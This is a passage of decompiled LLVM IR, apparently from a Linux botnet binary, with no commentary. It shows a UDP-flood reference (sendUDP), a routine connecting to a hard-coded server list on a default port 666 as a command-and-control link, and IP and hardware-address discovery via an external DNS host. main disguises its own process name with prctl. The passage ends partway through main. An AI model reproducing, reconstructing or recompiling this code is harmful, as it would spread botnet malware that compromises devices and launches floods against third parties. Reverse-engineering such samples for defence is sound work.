  %v0_804c7f3 = load i32, i32* @esp, align 4
  %v2_804c7f3 = icmp ugt i32 %v0_804c7f3, -17
  store i1 %v2_804c7f3, i1* %cf.global-to-local, align 1
  %v4_804c7f6 = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_804c7f9

dec_label_pc_804c7f9:                             ; preds = %dec_label_pc_804c7bb, %dec_label_pc_804c7a5, %dec_label_pc_804c7d6
  %stack_var_-28.0 = phi i32 [ %stack_var_-28.1, %dec_label_pc_804c7a5 ], [ %stack_var_-28.1, %dec_label_pc_804c7bb ], [ %v4_804c7f6, %dec_label_pc_804c7d6 ]
  %v4_804c7f9 = add i32 %storemerge18, 1
  br label %dec_label_pc_804c7fc

dec_label_pc_804c7fc:                             ; preds = %dec_label_pc_804c7fc.preheader, %dec_label_pc_804c7f9
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_804c7f9 ], [ 0, %dec_label_pc_804c7fc.preheader ]
  %storemerge18 = phi i32 [ %v4_804c7f9, %dec_label_pc_804c7f9 ], [ 0, %dec_label_pc_804c7fc.preheader ]
  %v0_804c810 = load i32, i32* @global_var_80584c8.31, align 8
  %v0_804c815 = load i32, i32* @global_var_80584cc.32, align 4
  store i32 %v0_804c815, i32* %edx.global-to-local, align 4
  %v10_804c82d = icmp ne i32 %v0_804c815, 0
  store i1 %v10_804c82d, i1* %cf.global-to-local, align 1
  br i1 %v10_804c82d, label %dec_label_pc_804c7a5, label %dec_label_pc_804c839

dec_label_pc_804c839:                             ; preds = %dec_label_pc_804c7fc
  %v10_804c84d = icmp ult i32 %storemerge18, %v0_804c810
  store i1 %v10_804c84d, i1* %cf.global-to-local, align 1
  br i1 %v10_804c84d, label %dec_label_pc_804c7a5, label %dec_label_pc_804c859

dec_label_pc_804c859:                             ; preds = %dec_label_pc_804c2bf, %dec_label_pc_804c30b, %dec_label_pc_804c839, %dec_label_pc_804c657, %dec_label_pc_804c453, %dec_label_pc_804c187, %dec_label_pc_804bf5d, %dec_label_pc_804c631, %dec_label_pc_804c3ad, %dec_label_pc_804c0a8, %dec_label_pc_804bf37, %dec_label_pc_804c63b, %dec_label_pc_804c431, %dec_label_pc_804c40e, %dec_label_pc_804c3f1, %dec_label_pc_804c3d4, %dec_label_pc_804c3b7, %dec_label_pc_804c32b, %dec_label_pc_804c164, %dec_label_pc_804c145, %dec_label_pc_804c126, %dec_label_pc_804c109, %dec_label_pc_804c0ec, %dec_label_pc_804c0cf, %dec_label_pc_804c0b2, %dec_label_pc_804bf7a, %dec_label_pc_804bf41, %dec_label_pc_804be91, %dec_label_pc_804be1d, %entry, %dec_label_pc_804c74a, %dec_label_pc_804c71f, %dec_label_pc_804beba
  %v0_804c860 = phi i32 [ %v1_804c663, %dec_label_pc_804c657 ], [ %v1_804c45f, %dec_label_pc_804c453 ], [ %v1_804c193, %dec_label_pc_804c187 ], [ %v1_804bf69, %dec_label_pc_804bf5d ], [ %v2_804c626, %dec_label_pc_804c631 ], [ %v2_804c3a2, %dec_label_pc_804c3ad ], [ %v2_804c09d, %dec_label_pc_804c0a8 ], [ %v2_804bf2c, %dec_label_pc_804bf37 ], [ %v1_804c647, %dec_label_pc_804c63b ], [ %v1_804c43d, %dec_label_pc_804c431 ], [ %v1_804c41a, %dec_label_pc_804c40e ], [ -1, %dec_label_pc_804c3f1 ], [ -1, %dec_label_pc_804c3d4 ], [ -1, %dec_label_pc_804c3b7 ], [ %v0_804c32b, %dec_label_pc_804c32b ], [ %v1_804c170, %dec_label_pc_804c164 ], [ %v1_804c151, %dec_label_pc_804c145 ], [ %v1_804c132, %dec_label_pc_804c126 ], [ -1, %dec_label_pc_804c109 ], [ -1, %dec_label_pc_804c0ec ], [ -1, %dec_label_pc_804c0cf ], [ -1, %dec_label_pc_804c0b2 ], [ %v0_804bf7a, %dec_label_pc_804bf7a ], [ %v1_804bf4d, %dec_label_pc_804bf41 ], [ %v0_804be91, %dec_label_pc_804be91 ], [ 0, %dec_label_pc_804be1d ], [ %v2_804bd7d, %entry ], [ %v2_804c78a, %dec_label_pc_804c74a ], [ %v0_804c71f, %dec_label_pc_804c71f ], [ %v1_804be9e, %dec_label_pc_804beba ], [ %v0_804c810, %dec_label_pc_804c839 ], [ %v2_804c2cb, %dec_label_pc_804c2bf ], [ %v2_804c315, %dec_label_pc_804c30b ]
  %v2_804c85c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804c85c, i32* @ebx, align 4
  store i32 %v0_804bd35, i32* @esi, align 4
  store i32 %v0_804bd34, i32* @edi, align 4
  ret i32 %v0_804c860

; uselistorder directives
  uselistorder i32 %storemerge18, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-28.1, { 0, 2, 1 }
  uselistorder i32 %v2_804c7a8, { 4, 2, 1, 3, 0 }
  uselistorder i1 %v0_804c77e, { 1, 0 }
  uselistorder i32 %v2_804c70c, { 1, 0 }
  uselistorder i32 %v0_804c702, { 1, 0 }
  uselistorder i32 %v2_804c67a, { 3, 0, 2, 1 }
  uselistorder i1 %v5_804c65f, { 1, 0, 4, 3, 2 }
  uselistorder i1 %v0_804c61a, { 1, 0 }
  uselistorder i32 %v2_804c5a0, { 1, 0 }
  uselistorder i32 %v0_804c596, { 1, 0 }
  uselistorder i1 %v5_804c538, { 1, 0 }
  uselistorder i32 %v2_804c476, { 3, 0, 2, 1 }
  uselistorder i32 %v1_804c422, { 1, 0 }
  uselistorder i32 %v1_804c41a, { 1, 0, 4, 2, 3 }
  uselistorder i1 %v5_804c3dc, { 1, 0, 11, 8, 7, 6, 10, 9, 5, 4, 3, 2 }
  uselistorder i1 %v0_804c396, { 1, 0 }
  uselistorder i32 %v2_804c315, { 0, 2, 1 }
  uselistorder i1 %v5_804c2ad, { 1, 0 }
  uselistorder i32 %v2_804c281, { 1, 0 }
  uselistorder i32 %v1_804c252, { 2, 1, 0 }
  uselistorder i32 %v2_804c24c, { 1, 0 }
  uselistorder i32 %v1_804c21d, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804c217, { 1, 0 }
  uselistorder i32 %v1_804c200, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804c1fa, { 1, 0 }
  uselistorder i32 %v2_804c1e3, { 1, 0 }
  uselistorder i32 %v2_804c1cc, { 1, 0 }
  uselistorder i32 %v2_804c1b5, { 1, 0 }
  uselistorder i32 %v2_804c1aa, { 5, 1, 0, 4, 3, 2 }
  uselistorder i32 %v2_804c18d, { 1, 0 }
  uselistorder i1 %v8_804c181, { 1, 0, 2 }
  uselistorder i32 %v1_804c178, { 1, 0 }
  uselistorder i32 %v1_804c170, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v2_804c16a, { 1, 0 }
  uselistorder i32 %v1_804c159, { 1, 0 }
  uselistorder i32 %v1_804c151, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v2_804c14b, { 1, 0 }
  uselistorder i32 %v1_804c13a, { 1, 0 }
  uselistorder i32 %v1_804c132, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v2_804c12c, { 1, 0 }
  uselistorder i32 %v2_804c10f, { 1, 0 }
  uselistorder i32 %v2_804c0f2, { 1, 0 }
  uselistorder i1 %v5_804c0d7, { 1, 0, 15, 14, 12, 11, 10, 9, 13, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v2_804c0d5, { 1, 0 }
  uselistorder i32 %v2_804c0b8, { 1, 0 }
  uselistorder i1 %v0_804c091, { 1, 0 }
  uselistorder i32 %v2_804c01a, { 1, 0 }
  uselistorder i32 %v2_804bffa, { 1, 0 }
  uselistorder i32 %v2_804bfe4, { 1, 0 }
  uselistorder i1 %v5_804bfc9, { 1, 0 }
  uselistorder i32 %v2_804bfa3, { 1, 0 }
  uselistorder i32 %v2_804bf8d, { 1, 0 }
  uselistorder i1 %v5_804bf65, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v2_804bf63, { 1, 0 }
  uselistorder i32 %v2_804bf47, { 1, 0 }
  uselistorder i1 %v0_804bf20, { 1, 0 }
  uselistorder i1 %v0_804be7e, { 1, 0 }
  uselistorder i32 %v0_804be1d, { 1, 0, 2 }
  uselistorder i1 %v0_804be0a, { 1, 0 }
  uselistorder i1 %v0_804bdbc, { 1, 0 }
  uselistorder i1 %v0_804bd71, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-300, { 3, 0, 1, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32 %tmp124, { 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 2, 0 }
  uselistorder i32 %tmp105, { 2, 14, 0, 13, 3, 4, 12, 5, 6, 1, 11, 7, 10, 8, 9 }
  uselistorder i32* %edx.global-to-local, { 13, 10, 11, 12, 14, 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i1* %cf.global-to-local, { 118, 124, 119, 120, 121, 122, 123, 125, 133, 126, 127, 128, 134, 129, 130, 131, 132, 0, 135, 136, 137, 138, 139, 140, 141, 1, 2, 3, 4, 142, 5, 6, 7, 12, 8, 9, 10, 11, 143, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 116, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 79, 41, 42, 46, 43, 44, 45, 117, 47, 48, 49, 50, 51, 52, 53, 115, 54, 55, 114, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 108, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 109, 110, 111, 112, 113 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8055a54.140 to i32), { 4, 0, 3, 1, 5, 2, 6, 7 }
  uselistorder label %dec_label_pc_804c859, { 2, 30, 31, 3, 11, 7, 4, 12, 13, 14, 15, 16, 8, 17, 1, 0, 5, 18, 19, 20, 21, 22, 23, 24, 9, 25, 6, 26, 10, 32, 27, 28, 29 }
  uselistorder label %dec_label_pc_804c7fc, { 1, 0 }
  uselistorder label %dec_label_pc_804c7f9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c74a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c6db, { 1, 0 }
  uselistorder label %dec_label_pc_804c5e6, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804c563, { 1, 0 }
  uselistorder label %dec_label_pc_804c52c, { 1, 0 }
  uselistorder label %dec_label_pc_804c4f7, { 1, 0 }
  uselistorder label %dec_label_pc_804c470, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804c2d8, { 1, 0 }
  uselistorder label %dec_label_pc_804c2a1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c05d, { 1, 0 }
  uselistorder label %dec_label_pc_804be47, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %v2_804c86a = ptrtoint i32* %stack_var_-4104 to i32
  %v3_804c87e = bitcast i32* %stack_var_-4104 to i8*
  %v4_804c87e = call i32 @__GI_memset(i8* %v3_804c87e, i32 0, i32 4096)
  %v0_804c886 = load i32, i32* @global_var_80584c0.18, align 64
  %v1_804c88b = icmp eq i32 %v0_804c886, 0
  br i1 %v1_804c88b, label %dec_label_pc_804c8aa, label %dec_label_pc_804c88f

dec_label_pc_804c88f:                             ; preds = %entry
  %v1_804c898 = call i32 @__libc_close(i32 %v0_804c886)
  store i32 0, i32* @global_var_80584c0.18, align 64
  br label %dec_label_pc_804c8aa

dec_label_pc_804c8aa:                             ; preds = %entry, %dec_label_pc_804c88f
  %v0_804c8aa = load i32, i32* @global_var_8058144.157, align 4
  %v1_804c8af = icmp eq i32 %v0_804c8aa, 0
  %v1_804c8b1 = icmp eq i1 %v1_804c8af, false
  br i1 %v1_804c8b1, label %dec_label_pc_804c8bf, label %dec_label_pc_804c8ca

dec_label_pc_804c8bf:                             ; preds = %dec_label_pc_804c8aa
  %v1_804c8c4 = add i32 %v0_804c8aa, 1
  br label %dec_label_pc_804c8ca

dec_label_pc_804c8ca:                             ; preds = %dec_label_pc_804c8aa, %dec_label_pc_804c8bf
  %storemerge = phi i32 [ %v1_804c8c4, %dec_label_pc_804c8bf ], [ 0, %dec_label_pc_804c8aa ]
  store i32 %storemerge, i32* @global_var_8058144.157, align 4
  %v1_804c8cf = mul i32 %storemerge, 4
  %v2_804c8cf = add i32 %v1_804c8cf, ptrtoint ([21 x i8]** @global_var_80580d0.158 to i32)
  %v3_804c8cf = inttoptr i32 %v2_804c8cf to i32*
  %v4_804c8cf = load i32, i32* %v3_804c8cf, align 4
  store i32 %v4_804c8cf, i32* @eax, align 4
  %v3_804c8e1 = call i32 @strcpy(i8* %v3_804c87e, i32 %v4_804c8cf)
  %v3_804c8fc = call i32 @__GI_strchr(i8* %v3_804c87e, i32 58)
  %v1_804c904 = icmp eq i32 %v3_804c8fc, 0
  br i1 %v1_804c904, label %dec_label_pc_804c943, label %dec_label_pc_804c908

dec_label_pc_804c908:                             ; preds = %dec_label_pc_804c8ca
  %v3_804c914 = call i32 @__GI_strchr(i8* %v3_804c87e, i32 58)
  %v1_804c91c = add i32 %v3_804c914, 1
  %v1_804c921 = call i32 @atol(i32 %v1_804c91c)
  %v3_804c938 = call i32 @__GI_strchr(i8* %v3_804c87e, i32 58)
  %v4_804c938 = inttoptr i32 %v3_804c938 to i8*
  store i8 0, i8* %v4_804c938, align 1
  br label %dec_label_pc_804c943

dec_label_pc_804c943:                             ; preds = %dec_label_pc_804c8ca, %dec_label_pc_804c908
  %stack_var_-8.0 = phi i32 [ 666, %dec_label_pc_804c8ca ], [ %v1_804c921, %dec_label_pc_804c908 ]
  %v3_804c94c = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_804c94c, i32* @global_var_80584c0.18, align 64
  %v4_804c96c = call i32 @connectTimeout(i32 %v3_804c94c, i32 %v2_804c86a, i32 %stack_var_-8.0, i32 30)
  %v1_804c974 = icmp eq i32 %v4_804c96c, 0
  %. = zext i1 %v1_804c974 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 (i32)* @atol, { 3, 2, 1, 0, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_804c943, { 1, 0 }
  uselistorder label %dec_label_pc_804c8ca, { 1, 0 }
  uselistorder label %dec_label_pc_804c8aa, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %stack_var_-4170 = alloca i32, align 4
  %stack_var_-4188 = alloca i32, align 4
  %stack_var_-4156 = alloca i8, align 1
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4204 = alloca i32, align 4
  %v5_804c9a8 = call i32 @socket(i32 2, i32 2, i32 0)
  %v13_804c9b3 = icmp eq i32 %v5_804c9a8, -1
  %v1_804c9b7 = icmp eq i1 %v13_804c9b3, false
  br i1 %v1_804c9b7, label %dec_label_pc_804c9c8, label %dec_label_pc_804cb8b

dec_label_pc_804c9c8:                             ; preds = %entry
  %v2_804c9c8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 2, i32* %stack_var_-40, align 4
  %v2_804c9f4 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_8055abf.159 to i32))
  %v2_804ca04 = call i32 @htons(i32 53)
  %v5_804ca1c = call i32 @__libc_connect(i32 %v5_804c9a8, i32 %v2_804c9c8, i32 16)
  %v13_804ca27 = icmp eq i32 %v5_804ca1c, -1
  %v1_804ca2b = icmp eq i1 %v13_804ca27, false
  br i1 %v1_804ca2b, label %dec_label_pc_804ca3c, label %dec_label_pc_804cb8b

dec_label_pc_804ca3c:                             ; preds = %dec_label_pc_804c9c8
  store i32 16, i32* %stack_var_-60, align 4
  %v2_804ca43 = ptrtoint i32* %stack_var_-56 to i32
  %v2_804ca49 = ptrtoint i32* %stack_var_-60 to i32
  %v5_804ca51 = call i32 @__GI_getsockname(i32 %v5_804c9a8, i32 %v2_804ca43, i32 %v2_804ca49)
  %v13_804ca5c = icmp eq i32 %v5_804ca51, -1
  %v1_804ca60 = icmp eq i1 %v13_804ca5c, false
  br i1 %v1_804ca60, label %dec_label_pc_804ca71, label %dec_label_pc_804cb8b

dec_label_pc_804ca71:                             ; preds = %dec_label_pc_804ca3c
  %v5_804ca83 = call i32 @__libc_open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8055ac7.160, i32 0, i32 0), i32 0)
  %v2_804cae6 = ptrtoint i8* %stack_var_-4156 to i32
  %v5_804caf851 = call i32 @fdgets(i32 %v2_804cae6, i32 4096, i32 %v5_804ca83)
  %v1_804cb0052 = icmp eq i32 %v5_804caf851, 0
  %v1_804cb0253 = icmp eq i1 %v1_804cb0052, false
  br i1 %v1_804cb0253, label %dec_label_pc_804ca90, label %dec_label_pc_804cb04

dec_label_pc_804ca90:                             ; preds = %dec_label_pc_804ca71, %dec_label_pc_804caca
  %v5_804ca9f = call i32 @strstr(i32 %v2_804cae6, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8055ad7.161, i32 0, i32 0))
  %v1_804caa7 = icmp eq i32 %v5_804ca9f, 0
  br i1 %v1_804caa7, label %dec_label_pc_804caca, label %dec_label_pc_804cab9.preheader

dec_label_pc_804cab9.preheader:                   ; preds = %dec_label_pc_804ca90
  %v2_804cabc42 = load i8, i8* %stack_var_-4156, align 1
  %v10_804cabe47 = icmp eq i8 %v2_804cabc42, 9
  %v1_804cac048 = icmp eq i1 %v10_804cabe47, false
  br i1 %v1_804cac048, label %dec_label_pc_804cab6, label %dec_label_pc_804cac2

dec_label_pc_804cab6:                             ; preds = %dec_label_pc_804cab9.preheader, %dec_label_pc_804cab6
  %v4_804cab949 = phi i32 [ %v5_804cab6, %dec_label_pc_804cab6 ], [ %v2_804cae6, %dec_label_pc_804cab9.preheader ]
  %v5_804cab6 = add i32 %v4_804cab949, 1
  %v22_804cab6 = inttoptr i32 %v5_804cab6 to i8*
  %v2_804cabc = load i8, i8* %v22_804cab6, align 1
  %v10_804cabe = icmp eq i8 %v2_804cabc, 9
  %v1_804cac0 = icmp eq i1 %v10_804cabe, false
  br i1 %v1_804cac0, label %dec_label_pc_804cab6, label %dec_label_pc_804cac2

dec_label_pc_804cac2:                             ; preds = %dec_label_pc_804cab6, %dec_label_pc_804cab9.preheader
  %storemerge5.lcssa = phi i8* [ %stack_var_-4156, %dec_label_pc_804cab9.preheader ], [ %v22_804cab6, %dec_label_pc_804cab6 ]
  store i8 0, i8* %storemerge5.lcssa, align 1
  br label %dec_label_pc_804cb04

dec_label_pc_804caca:                             ; preds = %dec_label_pc_804ca90
  %v6_804cade = call i32 @__GI_memset(i8* nonnull %stack_var_-4156, i32 0, i32 4096)
  %v5_804caf8 = call i32 @fdgets(i32 %v2_804cae6, i32 4096, i32 %v5_804ca83)
  %v1_804cb00 = icmp eq i32 %v5_804caf8, 0
  %v1_804cb02 = icmp eq i1 %v1_804cb00, false
  br i1 %v1_804cb02, label %dec_label_pc_804ca90, label %dec_label_pc_804cb04

dec_label_pc_804cb04:                             ; preds = %dec_label_pc_804ca71, %dec_label_pc_804caca, %dec_label_pc_804cac2
  %v2_804cb0a = call i32 @__libc_close(i32 %v5_804ca83)
  %v3_804cb12 = load i8, i8* %stack_var_-4156, align 1
  %v4_804cb18 = icmp eq i8 %v3_804cb12, 0
  br i1 %v4_804cb18, label %dec_label_pc_804cb7b, label %dec_label_pc_804cb1c

dec_label_pc_804cb1c:                             ; preds = %dec_label_pc_804cb04
  %v2_804cb26 = ptrtoint i32* %stack_var_-4188 to i32
  store i32 %v2_804cb26, i32* @eax, align 4
  %tmp39 = bitcast i32* %stack_var_-4188 to i8*
  %v5_804cb2d = call i32 @strcpy(i8* %tmp39, i32 %v2_804cae6)
  %v5_804cb47 = call i32 @ioctl(i32 %v5_804c9a8, i32 35111, i32 %v2_804cb26)
  %v2_804cb61 = ptrtoint i32* %stack_var_-4170 to i32
  br label %dec_label_pc_804cb58

dec_label_pc_804cb58:                             ; preds = %dec_label_pc_804cb1c, %dec_label_pc_804cb58
  %storemerge40 = phi i32 [ 0, %dec_label_pc_804cb1c ], [ %v4_804cb72, %dec_label_pc_804cb58 ]
  %v2_804cb67 = add i32 %storemerge40, %v2_804cb61
  %v1_804cb6a = inttoptr i32 %v2_804cb67 to i8*
  %v2_804cb6a = load i8, i8* %v1_804cb6a, align 1
  %v3_804cb6c = add i32 %storemerge40, ptrtoint (i8** @global_var_80584d0.162 to i32)
  %v4_804cb6c = inttoptr i32 %v3_804cb6c to i8*
  store i8 %v2_804cb6a, i8* %v4_804cb6c, align 1
  %v4_804cb72 = add nuw nsw i32 %storemerge40, 1
  %exitcond = icmp eq i32 %v4_804cb72, 6
  br i1 %exitcond, label %dec_label_pc_804cb7b.loopexit, label %dec_label_pc_804cb58

dec_label_pc_804cb7b.loopexit:                    ; preds = %dec_label_pc_804cb58
  br label %dec_label_pc_804cb7b

dec_label_pc_804cb7b:                             ; preds = %dec_label_pc_804cb7b.loopexit, %dec_label_pc_804cb04
  %v2_804cb81 = call i32 @__libc_close(i32 %v5_804c9a8)
  %v3_804cb97.pre = load i32, i32* %stack_var_-4204, align 4
  br label %dec_label_pc_804cb97

dec_label_pc_804cb8b:                             ; preds = %dec_label_pc_804ca3c, %dec_label_pc_804c9c8, %entry
  store i32 0, i32* %stack_var_-4204, align 4
  br label %dec_label_pc_804cb97

dec_label_pc_804cb97:                             ; preds = %dec_label_pc_804cb7b, %dec_label_pc_804cb8b
  %v3_804cb97 = phi i32 [ %v3_804cb97.pre, %dec_label_pc_804cb7b ], [ 0, %dec_label_pc_804cb8b ]
  ret i32 %v3_804cb97

; uselistorder directives
  uselistorder i32 %v5_804cab6, { 1, 0 }
  uselistorder i32 %v2_804cae6, { 2, 4, 0, 3, 1 }
  uselistorder i32 %v5_804ca83, { 2, 1, 0 }
  uselistorder i32 %v5_804c9a8, { 2, 1, 3, 4, 0 }
  uselistorder i32* %stack_var_-4204, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i8* %stack_var_-4156, { 4, 2, 0, 1, 3 }
  uselistorder i8 9, { 1, 0, 2, 3, 4 }
  uselistorder i32 (i32)* @htons, { 10, 9, 8, 7, 6, 5, 4, 11, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804cb97, { 1, 0 }
  uselistorder label %dec_label_pc_804cb58, { 1, 0 }
  uselistorder label %dec_label_pc_804cb04, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804cab6, { 1, 0 }
  uselistorder label %dec_label_pc_804ca90, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([7 x i8]* @global_var_8055ae2.163 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i8*, align 4
  %tmp123 = call i32 @__decompiler_undefined_function_0()
  %tmp126 = call i8* @__decompiler_undefined_function_2()
  %tmp135 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-5744 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-1648 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_-512 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  %stack_var_-5888 = alloca i8*, align 4
  %stack_var_-5876 = alloca i32, align 4
  %stack_var_-5872 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_804cba9 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_804cba9, i32* %stack_var_-24, align 4
  %v5_804cbba = icmp ult i32* %stack_var_-24, inttoptr (i32 5848 to i32*)
  store i1 %v5_804cbba, i1* %cf.global-to-local, align 1
  store i32 %v2_804cba9, i32* %edx.global-to-local, align 4
  %v1_804cbd3 = add i32 %v2_804cba9, 4
  %v2_804cbd3 = inttoptr i32 %v1_804cbd3 to i32*
  %v3_804cbd3 = load i32, i32* %v2_804cbd3, align 4
  store i32 %v3_804cbd3, i32* %eax.global-to-local, align 4
  %v1_804cbd6 = inttoptr i32 %v3_804cbd3 to i32*
  %v2_804cbd6 = load i32, i32* %v1_804cbd6, align 4
  %v1_804cbe3 = and i32 %v2_804cbd6, -256
  store i32 %v1_804cbe3, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_804cbe6 = inttoptr i32 %v2_804cbd6 to i8*
  store i32 %v2_804cbd6, i32* @edi, align 4
  %v3_804cbec = call i32 @_strlen(i8* %v4_804cbe6)
  %v4_804cbec = mul i32 %v3_804cbec, -1
  %v1_804cbf0 = sub i32 1, %v4_804cbec
  store i32 %v1_804cbf0, i32* %eax.global-to-local, align 4
  %v1_804cbf2 = sub i32 0, %v4_804cbec
  store i32 %v1_804cbf2, i32* %edx.global-to-local, align 4
  %v3_804cbfb = load i32, i32* %v2_804cbd3, align 4
  store i32 %v3_804cbfb, i32* %eax.global-to-local, align 4
  %v1_804cbfe = inttoptr i32 %v3_804cbfb to i32*
  %v2_804cbfe = load i32, i32* %v1_804cbfe, align 4
  store i32 %v2_804cbfe, i32* %eax.global-to-local, align 4
  %v0_804cc00 = load i32, i32* @esp, align 4
  %v5_804cc00 = icmp ult i32 %v0_804cc00, 4
  store i1 %v5_804cc00, i1* %cf.global-to-local, align 1
  %v5_804cc09 = inttoptr i32 %v2_804cbfe to i8*
  store i8* %v5_804cc09, i8** %stack_var_-5888, align 4
  %v5_804cc0a = call i32 @strncpy(i8* %v5_804cc09, i32 ptrtoint (i32* @global_var_8055ae9.164 to i32), i32 %v1_804cbf2)
  store i32 %v5_804cc0a, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8055ae9.164 to i32), i32* %edx.global-to-local, align 4
  store i32 %v2_804cba9, i32* @esi, align 4
  %v3_804cc1d = load i32, i32* %v2_804cbd3, align 4
  %v2_804cc20 = inttoptr i32 %v3_804cc1d to i32*
  store i32 ptrtoint (i32* @global_var_8055ae9.164 to i32), i32* %v2_804cc20, align 4
  store i32 ptrtoint (i32* @global_var_8055ae9.164 to i32), i32* %eax.global-to-local, align 4
  %v0_804cc25 = load i32, i32* @esp, align 4
  %v5_804cc25 = icmp ult i32 %v0_804cc25, 12
  store i1 %v5_804cc25, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5888, align 4
  %v6_804cc31 = call i32 @prctl(i32 15, i32 ptrtoint (i32* @global_var_8055ae9.164 to i32), i32 0, i32 0, i32 0)
  store i32 %v6_804cc31, i32* %eax.global-to-local, align 4
  %v5_804cc39 = icmp ult i32* %stack_var_-5872, inttoptr (i32 12 to i32*)
  store i1 %v5_804cc39, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5888, align 4
  %v3_804cc3e = call i32 @__GI_time(i32* null)
  store i32 %v3_804cc3e, i32* %eax.global-to-local, align 4
  %v0_804cc43 = load i32, i32* @esp, align 4
  %v2_804cc43 = icmp ugt i32 %v0_804cc43, -17
  store i1 %v2_804cc43, i1* %cf.global-to-local, align 1
  store i32 %v3_804cc3e, i32* @ebx, align 4
  %v0_804cc48 = call i32 @__libc_getpid()
  %v1_804cc4d = load i32, i32* @ebx, align 4
  %v2_804cc4d = xor i32 %v1_804cc4d, %v0_804cc48
  store i32 %v2_804cc4d, i32* @eax, align 4
  %v0_804cc4f = load i32, i32* @esp, align 4
  %v5_804cc4f = icmp ult i32 %v0_804cc4f, 12
  store i1 %v5_804cc4f, i1* %cf.global-to-local, align 1
  %v5_804cc52 = inttoptr i32 %v2_804cc4d to i8*
  store i8* %v5_804cc52, i8** %stack_var_-5888, align 4
  %v2_804cc53 = call i32 @srand(i32 %v2_804cc4d)
  store i32 %v2_804cc53, i32* %eax.global-to-local, align 4
  store i1 %v5_804cc39, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5888, align 4
  %v3_804cc60 = call i32 @__GI_time(i32* null)
  store i32 %v3_804cc60, i32* %eax.global-to-local, align 4
  %v0_804cc65 = load i32, i32* @esp, align 4
  %v2_804cc65 = icmp ugt i32 %v0_804cc65, -17
  store i1 %v2_804cc65, i1* %cf.global-to-local, align 1
  store i32 %v3_804cc60, i32* @ebx, align 4
  %v0_804cc6a = call i32 @__libc_getpid()
  %v1_804cc6f = load i32, i32* @ebx, align 4
  %v2_804cc6f = xor i32 %v1_804cc6f, %v0_804cc6a
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v2_804cc6f, i32* %eax.global-to-local, align 4
  store i32 %v2_804cc6f, i32* %stack_var_-5876, align 4
  %v1_804cc72 = call i32 @init_rand(i32 %v2_804cc6f)
  store i32 %v1_804cc72, i32* @eax, align 4
  %v5_804cc88 = icmp ult i32* %stack_var_-5872, inttoptr (i32 8 to i32*)
